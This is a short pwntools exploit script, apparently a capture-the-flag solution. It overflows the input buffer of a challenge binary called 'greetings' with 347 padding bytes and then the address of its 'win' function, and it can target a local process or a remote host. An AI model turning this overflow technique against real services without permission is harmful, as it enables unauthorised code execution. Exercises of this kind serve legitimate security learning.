#!/usr/bin/env python3

from pwn import *

exe = './greetings'
elf = context.binary = ELF(exe, checksec=False)
context(os='linux', arch='amd64')
context.log_level = 'info'

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# specify GDB script here (breakpoints etc)
gdbscript = '''
continue
'''.format(**locals())

## Since we just have a static with no checks, we do a simple ret 2 win
def exploit(p, elf):
    payload = b"A"*347
    payload += p64(elf.sym.win)
    p.sendlineafter(b'Name: ', payload)

def main():
    p = conn()
    exploit(p, elf)
    p.interactive()


if __name__ == "__main__":
    main()
